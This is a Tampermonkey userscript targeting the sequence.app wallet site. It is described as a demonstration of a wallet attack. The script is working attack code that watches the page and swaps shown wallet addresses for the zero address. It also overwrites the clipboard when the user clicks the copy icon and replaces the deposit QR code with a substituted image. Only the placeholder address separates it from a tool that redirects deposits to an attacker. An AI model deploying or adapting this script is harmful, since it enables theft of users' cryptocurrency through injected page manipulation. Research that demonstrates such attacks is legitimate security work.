// ==UserScript==
// @name         https://sequence.app/wallet/
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  The purpose of this script is solely for the demonstration of non-exploit related attacks.
// @author       https://github.com/jayden-sudo
// @match        https://sequence.app/*
// @icon         https://www.google.com/s2/favicons?domain=sequence.app
// @grant        none
// @run-at       document-body
// ==/UserScript==

/*
    This is an example of a wallet attack

    The specific sample items will be gradually increased.
    1. Modifying the user's wallet address, changing the user's deposit address to: 0x0000000000000000000000000000000000000000.

*/

(function () {
    'use strict';

    var targetNode = document.body;
    var config = { attributes: true, childList: true, subtree: true };
    var callback = function (mutationsList, observer) {
        for (var mutation of mutationsList) {
            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                mutation.addedNodes.forEach(node => {
                    try {
                        fakeAddress(node);
                    } catch (error) {
                        console.log(error);
                    }
                });
            }
        }
    };
    function fakeAddress(node) {
        if (node.nodeType === Node.TEXT_NODE) {
            if (node.nodeValue.startsWith('0x')) {
                if (node.nodeValue.length == 39) {
                    let selfAddress = node.parentNode.parentNode;
                    selfAddress.childNodes[0].childNodes[0].nodeValue = '0x0000000000000000000000000000000000000';
                    selfAddress.childNodes[1].childNodes[0].nodeValue = '000';
                } else if (node.nodeValue.length == 42) {
                    node.data = '0x0000000000000000000000000000000000000000'
                    node.nodeValue = '0x0000000000000000000000000000000000000000';
                }
            }

        } else {
            let c = node.childNodes;
            if (c.length == 0) {
                if (node.nodeName === 'path' && node.attributes['stroke']?.nodeValue == 'currentColor') {
                    console.log('copy address');
                    navigator.clipboard.writeText('0x0000000000000000000000000000000000000000');
                } else if (node.nodeName === 'CANVAS') {
                    let h = node.outerHTML;
                    // <canvas height="400" width="400" data-id="qr-code" style="height: 200px; width: 200px;"></canvas>
                    if (h.includes('data-id="qr-code"')) {
                        //  'canvas' -> 'img'
                        h = h.substring(8, h.length - 7);
                        node.outerHTML = '<img src="data:image/png;base64,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Wj0H7tnne94XDav3YccanTCH1U64bzzPXfg7fDkBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAwphzzjHG8gfNOZc/4+127MNq9vl57nOD+/w3rN7nE/bghLvAvRPO6mruwr05py8nAABAgzgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAljzjm3PGiMpb+/ehqrx39d6+ewg32+d8IcAAB+25zTlxMAAKBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACAhM91XdcYY/mD5pzLn/F2q/dhxx6sfsYJa7TaCXPY8U56ux377L4974S/zyecoxPmwPNOOEc73km+nAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBhzDnnGOPpcfzYnPPpIeTZ53vW6DsnrNNq3kn3nKN7zhH8c8L74oT7vHof5py+nAAAAA3iBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkfK7ruuacT4/jx8YYS39/xxqdMIfVrNG91WtEw459Xn0f3Dd+gz24d8Jd22H1Op3wP8yOZ/hyAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgITPdV3XGGP5g+acr/59vrPjLL3d6jXacRdOmMNq1uh53kffeftZ9c5rsEb8Fl9OAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABI+13Vdc86nx/FjY4ylv3/CGu2wep1W7/MOJ5ylE+bA89xnOMcJd+GEd9IJfDkBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBhzzjnGeHocPzbnXPr7O9Zo9Rx2ePtZ2rEHb1+jHdzneyfM4QSr98Ee3DvhLpzwd8FZfd4p58iXEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACR8dj1ozrnrUUvsGP8YY+nv75jD2/d5h9VrtPoc7XDCHLhnnxtO+NuzmrMK+/hyAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJDweXoAbzHGeHoIr7B6neacS3//hH1evUbXZZ//irfv8wlOOKsnnKMT5rCaNbpnjb7jywkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASPrseNMZY+vtzzqW/f4LVe3Bd79+Ht4//uvbs82reF/d2zOHtZ8k77zur5/D2c3SCE+7CCXM4wY6/z76cAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACR8dj1ozrn098cYS39/9fh3WL1Gu57B8064D6u5C/es0d9wwvvi7XN4+/h3efv/kjveqTvOki8nAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAljzjnHGMsfNOdc/gz4qRPuwo45cM87D/7xTvobvPPurb4LO/Zgxxx8OQEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAEDCmHPOMcbT4/ixOefTQ/ix1fuwY41OmMNq1uh5J7zzAGC3Hf9j+HICAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkDDmnPPpQUDFGOPpIfzYjiu9ep28lvgNO+6zs/o3eOc974T77Bx9x5cTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgITPdV3XGOPpccBX5pyv/v1TWKd73qv3nKN7J5wj+/y8HefohH1evU4nrNEOvpwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAg4bPrQXPOXY/iQWOMp4cAcF3Xnr87J7zz/H0+nz3+zup18r74ji8nAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAmfpwfwW8YYTw8hb8759BC41p/VE/b5hPu8eh92rNHbz5I1+o530vNOeOfxvFPumi8nAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASPg8PQD4a+acTw/hx8YYTw8hb/Ua7ThHb5+Du/ad1et0wvvihLPE+U54X1yXLycAAECEOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACZ+nBwB/zRjj6SHkzTmX/v6OPVg9B+7ZZ36L9/bfsPo+n/C3bfUz5py+nAAAAA3iBAAASBAnAABAgjgBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkfJ4ewG+Zcz49BPjKCWd1jPH0EP48e3Bvx12zD887YZ/9XfgbrNF3fDkBAAASxAkAAJAgTgAAgARxAgAAJIgTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAwmfXg8YYux4F/zfn9DtzzqeH8CNvH/91nTGH1U64zzv2efU6Oav3TjirqzlHDTv2wZcTAAAgQZwAAAAJ4gQAAEgQJwAAQII4AQAAEsQJAACQIE4AAIAEcQIAACSIEwAAIEGcAAAACeIEAABIECcAAECCOAEAABLECQAAkCBOAACABHECAAAkiBMAACBBnAAAAAniBAAASBAnAABAgjgBAAASxAkAAJDwXwcQ6DUbHJyFAAAAAElFTkSuQmCC" ' + h + 'img>';
                    }
                }
            } else {
                c.forEach(child => fakeAddress(child));
            }


        }
    }

    var observer = new MutationObserver(callback);
    observer.observe(targetNode, config);

})();


